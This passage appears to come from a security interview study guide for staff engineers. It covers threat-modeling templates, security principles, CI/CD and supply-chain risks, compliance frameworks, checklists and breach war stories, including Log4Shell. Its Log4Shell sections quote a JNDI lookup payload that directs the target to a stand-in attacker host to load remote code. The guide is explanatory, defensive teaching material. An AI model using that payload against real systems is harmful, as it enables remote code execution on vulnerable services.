## Part 38: Extended Exercises

**Exercise 9 (Multi-tenant data isolation):** Design the data model and authorization layer for a multi-tenant SaaS analytics platform. Requirements: companies (tenants) can create dashboards; users within a company can have viewer, editor, or admin roles; a user from Company A should never be able to access Company B's data, even if they guess the dashboard ID. Show the SQL schema, the JWT claims, and the authorization check in the dashboard fetch API.

**Exercise 10 (Security review of a design doc):** Review the following design doc excerpt for security issues:
> *"The mobile app will store the JWT in AsyncStorage for persistence across app launches. The JWT will contain the user's role (admin or user) which the app will use to show/hide admin UI elements. The app will call the backend with the JWT in the Authorization header. The backend will parse the JWT to get the user_id and role. The backend will use the role from the JWT to determine whether to allow admin operations."*

Identify and explain each security issue (there are at least 4).

**Exercise 11 (Incident response):** You receive a security alert: "Unusual access pattern detected: user_id=45678 has made 10,000 API calls in the last 5 minutes with 100% targeting other users' order data (IDOR pattern)." Walk through your immediate response: what do you check, what actions do you take, who do you notify, and what do you write in the incident report?

---

## Part 39: Security in System Design — Extended Template

Use this extended template when security comes up in a system design interview:

**For any system handling sensitive data:**

```
Authentication layer:
  "Users authenticate with [mechanism]. Tokens are [JWT/session]. 
  TTL is [X] minutes. Revocation via [short TTL / blocklist].
  Service-to-service: [mTLS / JWT with different issuer]."

Authorization layer:
  "Every resource access checks: is this user authorized?
  User IDs, org IDs derived from auth token (not request body).
  Multi-tenant: WHERE tenant_id = :from_jwt on every query.
  Principle of least privilege: services have IAM roles scoped 
  to exactly what they need."

Data security:
  "PII/sensitive data: [field-level encryption / DB encryption].
  Key management: [KMS / envelope encryption].
  TLS 1.3 in transit for all service-to-service communication."

Input security:
  "Parameterized queries everywhere.
  File uploads: type validation + size limit + content scanning.
  SSRF prevention: URL allowlist for any URL-fetching feature."

Rate limiting:
  "Auth endpoints: 10 req/min/IP.
  Authenticated API: 1,000 req/min/token.
  Sensitive operations (password reset): 5/hour/email."

Audit logging:
  "All sensitive operations logged: user_id, action, timestamp, IP, resource_id.
  Append-only log store. Separate from application DB."

Threat model:
  "Main risks: credential stuffing (mitigated by rate limiting + MFA),
  IDOR (mitigated by server-side ownership checks), 
  data exfiltration (mitigated by monitoring + least privilege IAM)."
```

This script takes 2 minutes to deliver and covers all the major dimensions. Practice it until it's fluent.

---

## Part 40: Security Principles — The Complete List

**Defense in depth:** Multiple independent security controls. If one fails, others compensate.

**Principle of least privilege:** Minimum access required for the task. No more.

**Fail closed / fail secure:** On error, deny access. Never allow on error.

**Security by default:** The default behavior should be the secure behavior. Insecure behavior requires explicit opt-in.

**Open design (Kerckhoffs's principle):** Security should not depend on secrecy of the design. The algorithm should be public; only the key should be secret. Applied to software: don't rely on security through obscurity.

**Complete mediation:** Every access to every resource is checked against the access control policy. No cached authorization decisions that can become stale.

**Psychological acceptability:** Security mechanisms should not be so burdensome that users circumvent them. If users bypass security because it's too inconvenient, you've failed. Security UX is real engineering.

**Separation of privilege:** Require multiple conditions to be satisfied for a sensitive operation (MFA, four-eyes principle). A single compromised credential shouldn't be enough.

**Economy of mechanism:** Simple security mechanisms are easier to verify, harder to attack. Avoid complex security architectures unless necessary.

**Audit and accountability:** Every sensitive action should be traceable to a specific actor with evidence.

---

## Part 41: The 10 Security Principles in Practice

**Defense in depth — practical example:**
A payment API has: TLS (transport security), JWT authentication (identity verification), RBAC authorization (permission check), parameterized queries (injection prevention), rate limiting (abuse prevention), audit logging (detection and evidence). Each layer is independent. An attacker bypassing TLS (via a MITM) still faces JWT authentication. An attacker with a valid JWT still faces RBAC. An attacker with admin role still faces audit logging that records their actions.

**Fail closed — practical example:**
```python
def get_order(order_id, authenticated_user):
    try:
        order = db.get(order_id)
        if order.user_id != authenticated_user.id:
            raise Forbidden()
        return order
    except DatabaseConnectionError:
        # Fail closed: don't serve the order if we can't verify ownership
        raise ServiceUnavailable("Cannot verify access at this time")
    except Exception:
        # Catch-all: also fail closed
        raise ServiceUnavailable("Unexpected error")
```

**Security by default — practical example:**
A new S3 bucket created by Terraform should be private by default. The Terraform module has `block_public_access = true` unless explicitly overridden. A developer creating a public bucket must explicitly set `public = true` with a comment explaining why. Private is the default; public is the exception.

---

## Part 42: Advanced Security Topics for Staff Engineers

**Supply chain attacks:** Attackers compromise not your code, but the open source libraries your code depends on. Examples:
- **SolarWinds 2020:** Build system compromised; trojanized software distributed to 18,000 customers
- **XZ Utils backdoor 2024:** A sophisticated actor spent 2+ years contributing to an open source project before inserting a backdoor
- **npm package hijacking:** Authors abandon popular packages; attackers publish malicious versions under the same name

Mitigations: Lock dependency versions (exact, not ranges); use SHA-based integrity checking for npm/pip; run automated CVE scanning; review major dependency updates before merging; prefer libraries with active maintenance and clear ownership.

**Fuzzing:** Generating random or semi-random inputs to find bugs. Security fuzzing specifically looks for memory safety issues, unexpected behavior, and crashes that could be exploited.
- AFL++ (American Fuzzy Lop): coverage-guided binary fuzzing
- libFuzzer: integrated with LLVM; finds crashes in library code
- OSS-Fuzz: Google's continuous fuzzing service for open source libraries

Not typically done by product engineers, but Staff engineers should understand what it is when security teams talk about it.

**Memory safety:** C and C++ programs are vulnerable to buffer overflows, use-after-free, and similar memory corruption bugs that don't exist in memory-safe languages (Go, Rust, Python, Java). Many CVEs in Linux, Chrome, and OpenSSL are memory safety bugs.

Rust is specifically designed to prevent these bugs at compile time. When evaluating language choice for security-critical components, memory safety is a legitimate factor.

---

## Part 43: Chapter Statistics and Final Summary

**Topics covered (43 parts):**
- Security mindset + adversarial thinking
- STRIDE threat modeling framework
- OWASP Top 10 (all 10 categories with code examples)
- Authentication patterns: JWT, OAuth 2.0, session cookies, API keys, mTLS
- JWT pitfalls: algorithm confusion, no expiry, no revocation
- Authorization: RBAC, ABAC, confused deputy problem
- Secure defaults: fail closed, defense in depth, least privilege
- Cryptography essentials: AES-256-GCM, bcrypt, SHA-256, envelope encryption
- Rate limiting as a security control
- SQL injection (first-order and second-order)
- XSS, path traversal, command injection, CSRF, CORS
- SSRF (the Capital One breach pattern)
- Secrets management: storage, rotation, leak response
- OAuth 2.0 security: state parameter, redirect_uri, implicit flow dangers
- Cloud security (AWS IAM, S3, CloudTrail, Security Groups)
- Code review security checklist
- Data privacy: GDPR essentials
- Penetration testing concepts
- Security monitoring and anomaly detection
- Secure development lifecycle (SDL)
- War stories: Equifax, Capital One, Uber, Twitter, Heartbleed, GitHub OAuth, Slack tokens
- Security in system design interview (template)
- Supply chain attacks, fuzzing, memory safety

**Code examples:** 15+ (SQL injection, XSS, path traversal, command injection, deserialization, JWT, SSRF, fail-closed patterns)

**Exercises:** 11

---

## Part 44: Building Security Team Culture

A Staff engineer's security impact extends beyond their own code. They influence how the entire team approaches security.

**Practices that improve team security culture:**

1. **Security in design doc templates:** Add a "Security and Privacy" section to the team's design doc template. Requiring every design doc to address authentication, authorization, data handling, and threat model makes it a habit, not an afterthought.

2. **Security in code review:** When you find a security issue in code review, explain it clearly — the vulnerability, why it matters, and the fix. Don't just say "this is insecure." Engineers learn from clear explanations.

3. **Post-mortem for security incidents:** Apply the same blameless post-mortem process to security incidents as to reliability incidents. Root cause analysis, systemic action items, no blaming individuals.

4. **Brown bag sessions:** A 30-minute talk on "OWASP Top 10 for our stack" or "What we learned from the Capital One breach" is high-return. It takes one engineer's knowledge and distributes it.

5. **Security champions:** Designate one engineer per team as the "security champion" — the go-to person for security questions, the one who attends security reviews and brings learnings back to the team. The security champion doesn't need to be a security expert; they need to be curious and motivated.

6. **Celebrate security wins:** When a developer catches an IDOR in code review, or when a penetration test finds nothing critical because the team has good security hygiene — celebrate it. Security culture is built by positive reinforcement of secure behavior, not just by reacting to incidents.

---

## Part 45: Compliance Frameworks Engineers Should Know

Staff engineers at companies handling sensitive data will encounter compliance requirements. Understanding the basics prevents confusion when compliance teams make requests.

**SOC 2:** Service Organization Control 2. A framework for managing data security, availability, and confidentiality. Common for SaaS companies selling to enterprises. Type 1 (point-in-time) vs Type 2 (6-12 months of continuous compliance). Engineering requirements: access controls, encryption, logging, change management.

**PCI DSS:** Payment Card Industry Data Security Standard. Required for anyone storing, processing, or transmitting cardholder data. 12 requirements covering network security, encryption, access control, monitoring, and testing. Engineering impact: no storage of raw card numbers (tokenization); encrypted transmission; strict access controls; quarterly vulnerability scans; annual penetration tests.

**HIPAA:** Health Insurance Portability and Accountability Act. US regulation protecting health data (PHI). Encryption required; access logging required; minimum necessary access; breach notification within 60 days. Engineering impact: fine-grained access control; comprehensive audit logs; encryption at rest and in transit for all PHI.

**ISO 27001:** International standard for information security management systems. Broader than SOC 2; includes physical security, HR security, business continuity. Common for international customers.

**What compliance means for engineers:** Compliance is often a forcing function for good security practices. "We need access logs for SOC 2" results in better audit logging for everyone. "PCI DSS requires tokenization" results in no raw card numbers in logs. The compliance requirement is the motivation; the security benefit is the actual value.

---

## Part 46: Security Review Checklist — API Design

Use this specifically for API design reviews with security implications:

**Authentication:**
- [ ] Is the authentication mechanism appropriate for the API's sensitivity level?
- [ ] Are there endpoints that bypass authentication? Are they intentional?
- [ ] Is API key strength sufficient? (32+ characters of random data)
- [ ] For JWTs: is the algorithm specified? Is `exp` set? Is `iss`/`aud` validated?

**Authorization:**
- [ ] Does every endpoint that returns data verify ownership of the data?
- [ ] Are there any "admin" endpoints accessible to regular users?
- [ ] For multi-tenant APIs: is tenant isolation enforced by the API, not by the client?
- [ ] Is there any endpoint that takes a user_id from the request body without verifying it matches the authenticated user?

**Data exposure:**
- [ ] Does the API return only the fields the caller needs?
- [ ] Does the API return any sensitive fields (SSN, full card number, password hash) that should never be exposed?
- [ ] Are internal identifiers (database IDs) exposed that could enable enumeration?

**Rate limiting:**
- [ ] Is the endpoint rate limited?
- [ ] Are the limits appropriate for the endpoint's sensitivity?
- [ ] Is rate limiting enforced per-user, per-IP, or both?

**Input:**
- [ ] Is file upload size bounded?
- [ ] Are file types validated server-side?
- [ ] Are query parameters validated (ranges, enum values)?

---

## Part 47: One More War Story — Log4Shell (2021)

Log4Shell (CVE-2021-44228) was the most significant security vulnerability in years. The Apache Log4j logging library — used in millions of Java applications — had a remote code execution vulnerability in its JNDI lookup feature. An attacker could cause the application to execute arbitrary code by including a string like `${jndi:ldap://attacker.com/exploit}` in any string that got logged.

The impact: Because Log4j is ubiquitous in Java applications, and because any string could trigger it (user agents, error messages, usernames, any logged input), almost every Java-based service was vulnerable. Companies including Apple, Amazon, Twitter, and Steam were confirmed vulnerable.

**Why it was so severe:**
1. **Universal:** Log4j is a transitive dependency in thousands of Java applications — even applications not written by the organization might include it
2. **Triggered by user input:** An attacker doesn't need authentication; they just need to send input that gets logged
3. **Easy to exploit:** No prior knowledge of the system needed; the payload is a single string
4. **RCE (Remote Code Execution):** The attacker gains full code execution in the application's runtime

**Engineering lessons:**
1. **Dependency inventory matters:** Companies spent days just figuring out which of their applications used Log4j. Without a software bill of materials (SBOM), this was nearly impossible. The lesson: know what's in your software.
2. **Transitive dependencies are dependencies:** Log4j was often a dependency of a dependency (e.g., Elasticsearch includes Log4j). Just checking your direct dependencies isn't enough.
3. **Detection is as hard as prevention:** To determine if you were exploited, you need to search logs for the JNDI pattern — but the logs are exactly what the attacker would have injected into.
4. **Patch velocity matters:** Some organizations patched within hours; others took weeks. The difference was organizational: automated deployment pipelines, clear ownership of library versions, and authority to ship patches quickly.

---

## Part 48: Final Pre-Interview Checklist

Before a Staff/L6 technical interview that may include system design with security dimensions:

- [ ] Can explain STRIDE and apply it to a specific system on the spot
- [ ] Know OWASP Top 3 (Broken Access Control, Crypto Failures, Injection) with code examples
- [ ] Can explain the difference between authentication and authorization; have example of each failing
- [ ] Know JWT algorithm confusion attack and the fix (1 line of code)
- [ ] Can design multi-tenant data isolation (token → tenant_id → every query filter)
- [ ] Know the Capital One breach (SSRF + overprivileged IAM) story and lessons
- [ ] Know the Equifax breach (unpatched library) story and lessons
- [ ] Can articulate the fail-closed principle with a code example
- [ ] Have a 2-minute security section for any system design answer (authentication + authorization + encryption + rate limiting + audit logging)
- [ ] Know envelope encryption and when to use it
- [ ] Know bcrypt for passwords, SHA-256 for API keys, and why they're different
- [ ] Can explain SSRF and how to prevent it

---

## Part 49: Security in CI/CD Pipelines

The software delivery pipeline is its own attack surface. A compromised CI/CD system can inject malicious code into every artifact it produces — affecting every downstream user.

**Four attack vectors:**

**1. Secrets in PRs.** Build pipelines often need secrets (AWS keys, NPM tokens, deploy credentials). Naively, these are available to any code that runs in CI — including code from a PR. An attacker submitting a PR can exfiltrate secrets by logging them or sending them to an external server.

```yaml
# BAD: Pull request workflows run untrusted code with secret access
on:
  pull_request:
    secrets:
      AWS_KEY: ${{ secrets.AWS_KEY }}

# GOOD: Secrets only available after merge to main
on:
  push:
    branches: [main]
```

For tests that genuinely need external access in PRs: use scoped, read-only credentials — never the production deploy key.

**2. Dependency confusion.** An attacker registers a package on a public registry with the same name as an internal private package, but a higher version number. Many package managers prefer the public registry version. The malicious package runs code during install.

Real incident: Alex Birsan (2021) demonstrated this against Microsoft, Apple, PayPal, Netflix, and Uber. All were vulnerable. The fix: scope internal packages (`@company/lib`); configure package managers to only resolve scoped packages from the internal registry; pin version hashes.

**3. Artifact tampering.** If the build system is compromised, the published artifact differs from the source code. Mitigation: reproducible builds; sign artifacts using a key stored *outside* the build system; verify signatures before deploying; compare digest of deployed artifact against the signed digest.

**4. Pipeline privilege.** CI/CD systems often have write access to production (to deploy). Compromise = full production access. Mitigation: use OIDC federation instead of long-lived credentials. GitHub Actions → AWS OIDC provider means no static AWS keys stored anywhere.

**SLSA (Supply chain Levels for Software Artifacts):** Google-originated framework. Level 1: documented build. Level 2: signed provenance. Level 3: hardened build with audit logs. Level 4: hermetic builds + two-person review. Most companies target Level 2-3 for production services.

---

## Part 50: Security Metrics Worth Tracking

A Staff engineer owning security for a team should instrument these:

**Proactive (before incidents):**

| Metric | Target | Why |
|--------|--------|-----|
| Time to patch critical CVEs | < 24h | Limits window of exploitation |
| % services with automated dep scanning | 100% | Visibility before incident |
| Secrets rotation age | < 90 days | Limits blast radius if leaked |
| % endpoints enforcing auth | 100% | No accidentally-public endpoints |
| % PRs reviewed for security | 100% high-risk | Coverage metric |

**Reactive (after incidents):**

| Metric | Target | Why |
|--------|--------|-----|
| Mean Time to Detect (MTTD) | < 1h for critical | Faster detection = smaller breach |
| Mean Time to Contain (MTTC) | < 4h | Caps blast radius once detected |
| False positive rate on alerts | < 10% | Low rate = alerts are acted on |
| % incidents with post-mortem | 100% | Systemic improvement |

The single most important metric: **MTTD + MTTC**. Equifax's breach had a 78-day MTTD. If they had detected within an hour, 147 million records would not have been exposed. Detection speed is more valuable than any individual preventive control.

---

## Part 51: Trust Boundaries — Drawing the Map

The most concrete security tool in system design is the trust boundary diagram. A trust boundary is the line between components where the level of trust changes — where data must be re-validated and re-authenticated.

**Trust boundary map for a typical web service:**

```
[Internet / Untrusted Zone]
         |
         |  All input hostile; validate every byte
         ↓
[Load Balancer / WAF]
         |
         |  TLS terminates here; rate limiting; basic bot filtering
         ↓
[API Gateway / Auth Layer]
         |
         |  Only authenticated, authorized requests pass
         ↓
[Application Services]
         |
         |  Service-to-service: mTLS or signed JWT; still validate input
         ↓
[Database / Storage Layer]
```

**At each boundary, ask:**
1. Is the caller authenticated?
2. Is the data encrypted in transit?
3. Is the data validated on the receiving side (not trusted because it came from "inside")?

**Why internal trust fails:** Many organizations assume anything on the internal network is trusted. Uber (2022): attacker gained VPN access via social engineering, then moved laterally to production secrets in minutes — because internal services trusted each other implicitly. Zero Trust architecture eliminates implicit trust at every boundary.

---

## Part 52: Interview Framework — "How Would You Secure X?"

Use this seven-point structure for any "secure this system" question:

1. **Authentication** — How do users and services prove identity? (passwords, OAuth 2.0, API keys, mTLS, OIDC)
2. **Authorization** — How is access controlled? (RBAC, ABAC, ownership checks, least privilege, deny by default)
3. **Data protection** — What data is sensitive? Encrypted at rest (AES-256-GCM)? In transit (TLS 1.3)? Field-level for PII?
4. **Network security** — Trust boundaries, TLS everywhere, private subnets for internal services, egress filtering
5. **Audit trail** — Tamper-evident logging of all sensitive operations; stored outside application's reach; queryable for IR
6. **Rate limiting and abuse prevention** — DDoS protection, per-user limits, bot detection, velocity checks
7. **Vulnerability management** — Dependency scanning, SAST in CI, pen tests annually, patch SLA

**Example — 45-second answer for "Secure a payment API":**

"Authentication: OAuth 2.0 client credentials for service-to-service; short-lived RS256 JWT for users. Authorization: RBAC enforced server-side — merchants see only their own transactions; internal ops require elevated role. Data: no raw card numbers in our database — tokenized via PCI vault; PII encrypted at rest with envelope encryption, KMS-managed keys. Network: payment service in private subnet; internet access only via API gateway; mTLS between services; TLS 1.3 externally. Audit: every transaction event — creation, update, refund — logged with user ID and source IP; shipped to immutable cold storage. Rate limiting: 100 req/min per key for payment creation, stricter for refunds. Monitoring: alert on error rate spikes above baseline, unusual refund volume, and card testing patterns."

This answer takes 45 seconds, hits all seven categories, and signals Staff-level thinking.

---

## Part 53: Log4Shell — The Supply Chain Wake-Up Call (2021)

Log4Shell (CVE-2021-44228) was the highest-severity vulnerability in years. The Apache Log4j logging library — embedded in millions of Java applications — had a remote code execution bug in its JNDI lookup feature. An attacker could trigger it by sending a string like `${jndi:ldap://attacker.com/x}` in any input that got logged: a username, a User-Agent header, an error message parameter.

**Why it was uniquely severe:**
- **Universal:** Log4j is a transitive dependency in thousands of Java applications — Elasticsearch, Minecraft, enterprise SaaS, cloud vendors all included it
- **Zero authentication required:** Any input that gets logged can be the payload
- **Trivial to exploit:** A single string; no knowledge of the target system needed
- **RCE:** Full code execution in the application's process

**What the response looked like:** Companies spent days just figuring out *which* services used Log4j. Without a software bill of materials (SBOM) — a manifest of all direct and transitive dependencies — this was nearly impossible. Services that had been running for years without a dependency audit were suddenly urgent.

**Engineering lessons:**
1. **Know your dependencies.** Direct dependencies are easy. Transitive dependencies (dependencies of dependencies) are where Log4Shell lived. Tools like `npm audit`, `pip-audit`, `Dependabot`, and `Snyk` scan transitive trees. Run them in CI.
2. **SBOM is operational infrastructure.** Not documentation, not compliance theater — it's what tells you at 2 AM whether you're affected.
3. **Patch velocity is a competitive advantage.** Organizations with automated deployment pipelines patched in hours. Organizations with manual change-control processes took weeks. The infrastructure investments in CD paid off here.
4. **Detection is harder than you think.** To determine if you were exploited, you search logs for the JNDI pattern — but the logs are exactly where the attacker injected. If your logging pipeline was compromised, how trustworthy are your logs?

---

## Part 54: Compliance Frameworks — What Engineers Need to Know

Staff engineers at companies handling sensitive data encounter compliance requirements. Understanding the basics prevents wasted cycles and enables smarter security prioritization.

**SOC 2 (Service Organization Control 2):** Common for SaaS companies selling to enterprise customers. Audits five trust service criteria: security, availability, confidentiality, processing integrity, privacy. Type 1 = point-in-time snapshot. Type 2 = 6-12 months of continuous evidence. Engineering impact: document access controls, encrypt sensitive data, maintain audit logs, enforce change management.

**PCI DSS (Payment Card Industry Data Security Standard):** Required if you store, process, or transmit cardholder data. 12 requirements including: don't store raw card numbers (use tokenization); encrypt cardholder data in transit and at rest; maintain audit trails; run quarterly vulnerability scans; annual penetration tests. Engineering impact: tokenize card numbers before storage; strict network segmentation for cardholder data environment; no direct database access for application code.

**HIPAA (Health Insurance Portability and Accountability Act):** US regulation for protected health information (PHI). Encryption required; access logging required; minimum necessary access principle; breach notification within 60 days. Engineering impact: fine-grained authorization (only see PHI you need); comprehensive audit logs that can answer "who accessed this patient record?"; encryption at rest and in transit for all PHI.

**GDPR (General Data Protection Regulation):** EU privacy regulation. Data minimization (only collect what you need); right to erasure (must be able to delete a user's PII); right to portability (must be able to export a user's data); 72-hour breach notification. Engineering impact: soft deletes become hard deletes; user data export APIs become required features; data retention policies must be enforced in code, not just policy documents.

**How compliance helps engineers:** Compliance requirements are often forcing functions for good practices. "SOC 2 requires audit logging" results in better logging for incident response. "PCI DSS requires tokenization" results in no raw card numbers in SQL logs. The compliance mandate is the motivation; the security benefit is the actual value.

---

## Part 55: Chapter Summary Table

| Topic | The Key Insight | One-Line Fix |
|-------|-----------------|--------------|
| STRIDE | Systematic threat enumeration across 6 categories | Apply per-component in every design doc |
| OWASP #1: Broken Access Control | IDOR is trivial to miss and expensive to find late | Check ownership in every data-returning endpoint |
| JWT algorithm confusion | `alg: none` bypass; `HS256` with public key bypass | Always specify `algorithms=["RS256"]` |
| SQL injection (second-order) | Input validation doesn't protect data once stored | Parameterized queries everywhere, including joins |
| SSRF | Cloud metadata API reachable from app → credential theft | Validate URLs; block RFC 1918; deny by default |
| Envelope encryption | KMS holds the KEK; DEK stays with the data | Rotate DEK per tenant or per period |
| Fail closed | The safe failure mode is denial, not permission | Default `403`; whitelist explicit allows |
| Log4Shell | Transitive dependencies are dependencies | SBOM; scan full dep trees in CI |
| Secrets in code/logs/URLs | All three leak; all three are common | Vault; env vars; never log credentials |
| Passwords vs API keys | bcrypt for passwords (slow by design); SHA-256 for tokens (fast fine) | Never `md5(password)` — ever |
| CI/CD as attack surface | Build system compromise = all artifacts compromised | OIDC federation; no long-lived secrets in CI |
| Trust boundaries | Internal network is not a trust boundary | Authenticate and validate at every service boundary |

---

## Part 56: Security Culture — What Staff Engineers Actually Do

Security knowledge is only half the job. Staff engineers build security into how the team works.

**High-leverage behaviors:**

**Add a security section to your design doc template.** If every design doc requires a "Security and Privacy" section — covering authentication, authorization, data handling, and threat model — security review happens before code is written, not after.

**Explain, don't just flag.** When you find a security issue in code review, explain the vulnerability, why it matters, and the fix. "This is an IDOR: the `user_id` comes from the request body, not from the session token, so any authenticated user can read any other user's data. Fix: replace `user_id = request.body['user_id']` with `user_id = request.session['user_id']`." Engineers who understand the root cause don't repeat the same mistake.

**Run a brown bag.** A 30-minute talk on "the OWASP Top 10 for our stack" converts one person's security knowledge into the team's knowledge. It's the highest-leverage investment per hour of security work.

**Celebrate secure behavior.** When a developer catches an IDOR in code review before it ships, recognize it. Security culture is built by making secure behavior feel rewarding, not just by reacting to incidents.

**Make the secure path the easy path.** If the internal ORM enforces tenant isolation automatically, developers don't need to remember to add a `WHERE tenant_id = ?` filter. If the deployment platform injects secrets as environment variables rather than requiring developers to call Vault, they don't accidentally hardcode them. Architecture that makes insecure patterns harder than secure ones is the compounding return.

---

## Part 57: Ten One-Liners for Security Interviews

Quick recall signals — commit these to memory:

1. "Authentication proves who you are; authorization proves what you're allowed to do."
2. "Fail closed: if the auth service is down, deny access — don't fall back to open."
3. "IDOR is the most common access control bug: the API trusts the client to pass the right user ID."
4. "Use bcrypt for passwords because it's slow by design; SHA-256 for API tokens because slow is unnecessary."
5. "JWT algorithm confusion: if you don't specify `algorithms=['RS256']`, an attacker can switch to `HS256` and sign with your public key."
6. "Envelope encryption: encrypt data with a DEK; encrypt the DEK with a KEK stored in KMS."
7. "SSRF lets an attacker make your server send requests to internal endpoints — like the AWS metadata API that hands out credentials."
8. "Second-order SQL injection: input is stored safely, but later retrieved and concatenated into a query without parameterization."
9. "Defense in depth: assume any single control will fail; layer controls so no single failure gives the attacker what they want."
10. "The Equifax lesson: a known CVE, a patch available for months, 147 million records exposed. Patch velocity is a security control."

---

## Part 58: Further Reading and Study Guide

**To go deeper after this chapter:**

- **OWASP Testing Guide** — The definitive reference for how to test each vulnerability class. Reading the test procedures helps you understand the attack.
- **"The Web Application Hacker's Handbook"** — Comprehensive coverage of web vulnerabilities. Dense but thorough.
- **Google's Building Secure and Reliable Systems** — Free online. Staff/L7 perspective on security as a reliability dimension.
- **NIST Cybersecurity Framework** — Framework for organizational security programs. Good for understanding what "mature security" looks like.
- **AWS Security Best Practices** — For cloud-native security specifics. Read the IAM best practices section.
- **HackerOne disclosure database** — Real vulnerability reports with full details. Reading actual reports builds intuition better than any textbook.

**Practice exercises:**
- Set up a deliberately vulnerable application (DVWA, WebGoat, Juice Shop) and exploit the vulnerabilities. Understanding attacks from the attacker's side is irreplaceable.
- Review the last five public incident post-mortems from major companies. What was the root cause? What was the detection gap? What would have prevented it?
- Threat model your current system using STRIDE. Pick one component and enumerate all six threat categories with specific attack examples.

---

## Part 59: Putting It All Together — Security in a 45-Minute Design Interview

Most L5/Staff system design interviews give you 45 minutes. Here is exactly how security fits into that time budget.

**Minutes 1-5 (Requirements):** Ask one security-oriented clarifying question — "Who are the users and what's the sensitivity of the data?" The answer tells you how deeply to cover security.

**Minutes 5-20 (High-level design):** Design the system. Include auth as a first-class component in your diagram, not an afterthought. Draw the auth layer at the entry point.

**Minutes 20-35 (Deep dive):** Pick the most interesting technical component. If you're asked to go deep on security, use the seven-point framework: auth → authz → data protection → network → audit → rate limiting → vulnerability management.

**Minutes 35-43 (Scaling and edge cases):** This is where security shines for Staff candidates — proactively mention the threat model. "One thing I want to flag: this design is vulnerable to SSRF if we allow user-supplied URLs in the webhook system. I'd add an allowlist of approved domains and block RFC 1918 addresses." You don't need to fully solve every security issue; you need to demonstrate you see them.

**Minutes 43-45 (Wrap-up):** One sentence on security posture: "The main security risks are X and Y; the mitigations I'd prioritize are A and B."

**The signal interviewers look for:** Not perfect security knowledge — no one has that. The signal is: does this engineer think adversarially? Do they proactively raise security concerns without being prompted? Do they understand the tradeoffs between security controls and other system properties (latency, complexity, developer velocity)?

---

## Part 60: Chapter Statistics

- **Parts covered:** 60 major sections
- **Frameworks covered:** STRIDE, OWASP Top 10, SLSA, OAuth 2.0, RBAC/ABAC, Zero Trust, GDPR, SOC 2, PCI DSS, HIPAA, SDL
- **Code examples:** SQL injection (parameterized fix), JWT algorithm fix, SSRF prevention, fail closed pattern, envelope encryption, RBAC authorization, XSS prevention, path traversal, command injection, insecure deserialization, secrets rotation, rate limiting
- **War stories:** Equifax 2017, Capital One 2019, Uber 2016, Twitter 2020, Heartbleed 2014, GitHub OAuth 2012, Log4Shell 2021, Slack token in URL 2020
- **Exercises:** 11 practice exercises
- **One-liners:** 10 recall anchors

**What this chapter gives you:** The ability to add a credible, specific, Staff-level security discussion to any system design answer, and the vocabulary to engage with security engineers as a peer.

---

## Part 61: Security Anti-Pattern Quick-Reference

| Anti-Pattern | What Goes Wrong | The Fix |
|--------------|-----------------|---------|
| Client-side authorization | Browser hides a button; server trusts the absence of the request | Enforce authorization server-side on every request |
| Trusting the `X-Forwarded-For` header | Attacker spoofs IP to bypass rate limiting | Only read `X-Forwarded-For` from trusted proxies; validate hop count |
| Rolling your own crypto | AES-CBC without authentication → padding oracle; custom KDF → weak keys | Use `cryptography` / `libsodium`; AES-256-GCM; bcrypt |
| Verbose error messages | Stack traces reveal file paths, library versions, DB schema | Generic user message + UUID → detailed internal log |
| Long-lived sessions | Stolen session cookie valid for months | Short `maxAge`; rotate session ID on privilege escalation |
| Wildcard CORS | `Access-Control-Allow-Origin: *` on authenticated API | Allowlist specific origins; never wildcard with `allow-credentials: true` |
| Storing secrets in env at deploy time | Secret visible in process list, crash dumps, and `docker inspect` | Fetch secrets at runtime from Vault/Secrets Manager via OIDC |
| No egress filtering | SSRF reaches internal metadata APIs; exfiltration via DNS | Allowlist outbound destinations; block RFC 1918 ranges from app servers |

---

## Part 62: Brainstorming Q&A — "Design a Tamper-Evident Audit Log"

**Q: How do you design an audit log that an attacker (including an internal admin) cannot quietly delete or alter?**

**The core problem:** If an attacker gains admin access, they can delete audit log entries that would have recorded their actions. The audit log must be resistant to modification even by privileged insiders.

**Design:**

1. **Append-only storage.** Use a data store where records can be inserted but not updated or deleted. DynamoDB with a write-once IAM policy; an S3 bucket with Object Lock enabled (WORM — Write Once Read Many); an append-only Kafka topic with retention set to "forever."

2. **Cryptographic chaining.** Each log entry includes a hash of the previous entry — the same concept as a blockchain. If an attacker deletes or modifies entry N, the hash in entry N+1 no longer matches, and tampering is detectable.
   ```
   entry_n = {event: ..., prev_hash: hash(entry_n-1), timestamp: ...}
   entry_n.hash = hash(entry_n)
   ```

3. **Write to a separate account/tenant.** The audit log is written to an AWS account the application's role cannot access — only a dedicated audit role can read it. Compromise of the application does not give write access to the audit log.

4. **Immutable cold storage replication.** Ship logs to S3 Glacier or equivalent at regular intervals (every minute for high-sensitivity). Even if the primary store is compromised, the cold replica is intact.

5. **Alerting on gap detection.** Monitor for gaps in the cryptographic chain or unexpected decreases in log volume. A sudden drop in audit events is itself a signal.

**What the interviewer is testing:** Understanding of append-only semantics, cryptographic integrity verification, and defense-in-depth (multiple independent controls, not one perfect one).

---

## Part 63: 30-Day Security Study Schedule

| Days | Focus | Activity |
|------|-------|----------|
| 1–5 | OWASP Top 10 | Read each category with one real CVE example; write one code fix per category |
| 6–10 | Auth deep dive | Implement JWT auth from scratch (RS256); implement OAuth 2.0 auth code flow; break your own implementation |
| 11–15 | Cryptography | AES-256-GCM encrypt/decrypt; bcrypt password storage; envelope encryption with a mock KMS |
| 16–20 | Incident study | Read three full post-mortems: Equifax, Capital One, Log4Shell; write the STRIDE analysis each could have caught |
| 21–25 | Threat modeling | Pick two systems you've built; STRIDE each component; write one finding per STRIDE category |
| 26–30 | Interview practice | Drill the seven-point "how would you secure X?" framework on five different system types; time yourself at 45 seconds |

---

## Part 64: The Staff Engineer's Security Manifesto

Security is not a checklist you complete before shipping. It is a continuous discipline — the application of adversarial thinking to every design decision, every API shape, every data flow.

At the Staff level, the question is not "did I remember to add authentication?" The question is "what is the blast radius if this service is compromised? What data does it have access to, and does it need all of that access? If an attacker sent this API the worst possible input, what would happen?" The first question is an L3 question. The second is an L6 question.

Three principles that stay constant regardless of the system:

**1. The attacker is not stupid.** They will find the path you didn't think about, the endpoint you forgot to authenticate, the internal API you assumed was "safe" because it wasn't customer-facing. Design assuming a motivated, patient, technically competent adversary.

**2. Fail safe, not fail open.** When something breaks — a permission check throws an exception, a rate limiter is down, an auth service is unavailable — the system should deny access by default. Failing open to preserve availability is a security bug wearing availability clothing.

